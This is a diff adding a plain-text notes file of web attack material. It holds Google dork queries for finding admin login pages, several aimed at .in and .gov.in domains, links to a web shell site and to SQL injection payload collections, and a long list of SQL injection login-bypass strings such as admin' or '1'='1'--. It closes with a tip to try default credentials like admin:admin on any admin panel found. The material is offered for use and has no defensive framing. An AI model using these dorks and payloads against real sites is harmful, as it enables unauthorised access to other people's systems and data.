@@ -1,0 +1,146 @@
+inurl:/admin/admin_login.html
+inurl:/admin/admin-login.html
+inurl:/admin/adminLogin.html
+inurl:/admin/admin_login.php
+inurl:/admin/admin-login.php
+inurl:/admin/adminLogin.php
+inurl:/admin/admin_management.php
+inurl:/admin/admin.php
+inurl:/admin/admin_users.php
+inurl:/admin/adminview.php
+inurl:/admin/adm.php
+inurl:/adminarea/index.html
+inurl:/adm/index.html
+inurl:/adm/index.php
+inurl:/admin/list_gallery.php
+inurl:/admin/login
+inurl:/adminLogin/ inurl:/admin/AdminDashboard.php
+inurl:/admin/dashboard/index.php
+inurl:/admin/dashboard.php
+inurl:/admin/dashbord.php
+inurl:/admin/dash.php
+/admin/index.php site:.in
+/admin/index.php site:.gov.in
+inurl:/admin/index.php site:.in
+/admin/index.html site:.in
+/admin1/index.php site:.in
+
+
+Shell : https://shell.prinsh.com/#home
+https://medium.com/@cuncis/google-dork-cheat-sheet-for-finding-hidden-admin-panels-379e3414d486
+https://github.com/Ishanoshada/GDorks
+
+https://github.com/payloadbox/sql-injection-payload-list?tab=readme-ov-file
+https://infosecwriteups.com/sql-injection-payload-list-b97656cfd66b
+https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
+
+
+inurl:/admin/admin_login.html site:.in
+inurl:/admin/admin-login.html site:.in
+inurl:/admin/adminLogin.html site:.in
+inurl:/admin/admin_login.php site:.in
+inurl:/admin/admin-login.php site:.in
+inurl:/admin/adminLogin.php site:.in
+inurl:/admin/admin_management.php site:.in
+inurl:/admin/admin.php site:.in
+inurl:/admin/admin_users.php site:.in
+inurl:/admin/adminview.php site:.in
+inurl:/admin/adm.php site:.in
+inurl:/adminarea/index.html site:.in
+inurl:/adm/index.html site:.in
+inurl:/adm/index.php site:.in
+inurl:/admin/list_gallery.php site:.in
+inurl:/admin/login site:.in
+inurl:/adminLogin/ inurl:/admin/AdminDashboard.php site:.in
+inurl:/admin/dashboard/index.php site:.in
+inurl:/admin/dashboard.php site:.in
+inurl:/admin/dashbord.php site:.in
+inurl:/admin/dash.php site:.in
+superadmin/login.php
+
+
+") or ("x")=("x
+") or ('x')=("x
+") or true--
+")) or (("x"))=(("x
+"))or(("or))=(("x
+")or true--
+"or 'x'='x
+"or"" "
+"or""*"
+"or""-"
+"or""^"
+' or ''-'
+' or 0=0 –
+' or 1=1 limit 1 -- -+
+' or 1=1 limit 1-- -+
+' or 1=1#
+' or 1=1/*
+'="or'
+'=''or'
+'or 1=1 limit 1-- -+
+'or true--
+'or' '='
+'or''&'
+'or'''
+'or''*'
+'or''-'
+'or''^'
+0'or'0'='0
+1 'or' 1 '=' 1
+1'or'1'='1
+1=1 or 1=1--
+
+admin
+admin"--
+admin' #
+admin' --
+admin' or '1'='1
+admin' or '1'='1'#
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or 1=1
+admin' or 1=1#
+admin' or 1=1--
+admin' or 1=1/*
+admin'#
+admin') or '1'='1
+admin') or '1'='1'#
+admin') or '1'='1'--
+admin') or '1'='1'/*
+admin') or ('1'='1
+admin') or ('1'='1'#
+admin') or ('1'='1'--
+admin') or ('1'='1'/*
+admin'--
+admin'/*
+admin'or 1+1 or "="
+admin'or 1=1 or ''='
+admin'or'1'='1
+admin'or'1'='1'#
+admin'or'1'='1'--
+admin'or'1'='1'/*
+or 1=1
+or 1=1#
+or 1=1--
+or 1=1/*
+or true--
+Sql admin  by pass quarry
+‘ or ‘1’ = ‘1
+‘ or ‘1’ = ‘1 #
+‘ or ‘1’ = ‘1 — -
+‘ or ‘1’ = ‘1’
+
+
+
+Tip: if you found admin panel don't forget to test the default credentials
+
+admin:admin
+root:root
+test:test
+guest:guest
+admin:passwd
+sub.target.com:sub.target.com
+
+
+
